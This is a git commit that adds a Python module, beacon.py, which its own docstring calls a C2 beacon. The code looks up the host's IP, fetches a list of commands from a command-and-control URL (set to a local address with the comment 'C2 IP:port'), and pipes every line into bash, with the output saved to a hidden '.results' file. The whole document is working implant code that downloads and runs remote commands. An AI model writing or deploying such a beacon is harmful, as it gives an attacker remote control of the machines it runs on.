a9cec28a8757822c0ff95d80c7c7cddfb1ff3477
degenerat3 <james.maskelony@gmail.com>
2019-04-02 14:45:32 -0400

    added beacon module

---
+++ beacon.py
@@ -0,0 +1,32 @@
+"""
+Hit dat C2, get dem commands
+"""
+
+import socket
+import urllib as u
+import sys
+from subprocess import *
+
+SERVER_IP = "127.0.0.1:5000"    # C2 IP:port
+
+
+def get_ip():
+    # Get the preffered IP of the local machine
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close
+    return ip
+
+def callback(ip, server):
+    cb_url = "http://" + server + "/" + ip + "/enderman"
+    code = u.urlopen(cb_url).readlines()
+    out = open(".results","w")
+    p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
+    for line in code:
+        p.stdin.write(line)
+    p.communicate()
+    out.close()
+
+ip = get_ip()
+callback(ip, SERVER_IP)
